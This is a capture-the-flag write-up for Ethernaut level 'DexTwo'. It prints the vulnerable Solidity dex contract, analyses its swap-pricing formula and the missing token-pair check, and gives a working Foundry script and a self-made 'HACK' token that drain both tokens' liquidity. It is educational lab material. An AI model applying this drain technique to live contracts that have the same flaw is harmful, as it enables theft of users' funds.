# Ethernaut Level 23 DexTwo

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

The `Dex` contract starts with a liquidity of 100 for both token1 and token2. Player starts with a balance of 10 for both tokens. We have to exploit the vulnerability of the contract to drain the dex liquidity of both tokens. The swapping logic is in function `getSwapPrice()`: `return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)))`. We can see that we caculate `swapAmount` by using a simple ratio of from-to liquidity and times `amountFrom`. We can use mathematical analysis to represent this swapping logic: 

We can let $X_n$ to be the liquidity of *from* token before n-th swap, and $Y_n$ to be the liquidity of *to* token before n-th swap. For the attacker (user), we set $a_n$ to be the amount of *from* token that the attacker wants to swap from the dex, and $b_n$ to be the amount of *to* token that will be swapped based on the swapping logic. We will have:


$$
b_n = \lfloor\frac{Y_n a_n}{X_n} \rfloor 
$$
It is true when $a_n <= attackerBalance$.

And we have:
$$
X_{n+1} = X_n + a_n \\
Y_{n+1} = Y_n - b_n
$$
Notice that there is a slight difference between the `DexTwo` and the `Dex`: it does not have the line: `require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");`, which means that we can basically swap any token that we want for token1 or token2. 

So, a simple way to drain the liquidity of *to* token, i.e., to let $Y_{n+1}=0$, is to let $b_n=Y_n$, i.e., $a_n=X_n$. Since the *from* token might not necessarily be token1 or token2, which has a solid liquidity of 100, we can just send the contract with our self-made token `HACK`, then swap all the `HACK` that we just sent it for token1 to drain the `HACK` liquidity ($a_n=X_n$), then we can drain the token1 liquidity ($Y_{n+1}=0$).

`IDexTwo.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function add_liquidity(address token_address, uint256 amount) external;
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

```

we use an interface to interact with `DexTwo` instance.

`HackToken.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract HackToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

We use the exact same code as `SwapToken` to create our own `ERC20` token `HACK`. 

`DexTwo.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {IDexTwo} from "../src/IDexTwo.sol";
import {HackToken} from "../src/HackToken.sol";

contract DexTwoScript is Script {
    address constant DEX_TWO_ADDRESS = 0xXXXXXXXXX;
    uint256 constant INITIAL_HACK_TOKEN_BALANCE = 1000 ether;
    uint256 constant HACK_TOKEN_SWAP_AMOUNT = 1 ether;
    IDexTwo dexTwo = IDexTwo(DEX_TWO_ADDRESS);
    address token1 = dexTwo.token1();
    address token2 = dexTwo.token2();
    HackToken hackToken;

    function run() external {
        vm.startBroadcast();

        hackToken = new HackToken(DEX_TWO_ADDRESS, "HackToken", "HACK", INITIAL_HACK_TOKEN_BALANCE);
        // set allowance[EOA][Dex] so that dex can pull hackToken during swap
        hackToken.approve(msg.sender, DEX_TWO_ADDRESS, INITIAL_HACK_TOKEN_BALANCE);
        // Let *your EOA* act as spender for your own tokens when calling transferFrom
        // set allowance[EOA][EOA]
        hackToken.approve(msg.sender, type(uint256).max);

        hackToken.transferFrom(msg.sender, DEX_TWO_ADDRESS, HACK_TOKEN_SWAP_AMOUNT);
        // dex now have a liquidity of 1 HACK
        dexTwo.swap(address(hackToken), token1, HACK_TOKEN_SWAP_AMOUNT);
        console.log("DexTwo token1 balance after swap:", dexTwo.balanceOf(token1, DEX_TWO_ADDRESS));

        // dex now have a liquidity of 2 HACK
        dexTwo.swap(address(hackToken), token2, HACK_TOKEN_SWAP_AMOUNT * 2);
        console.log("DexTwo token2 balance after swap:", dexTwo.balanceOf(token2, DEX_TWO_ADDRESS));

        vm.stopBroadcast();
    }
}
```

In the script, we first deploy the `HackToken`, then send it to the dex, and swap them for all of the token1 and token2 that it has. A few things have to be noticed though. For setting the allowance of `HACK`, we have to both approve dex and **ourselves** (EOA) to pull the token, since not only the dex would pull the token, but also ourselves would transfer the token from our EOA to the dex. Or you can use `transfer` instead of `transferFrom` to avoid allowance thing.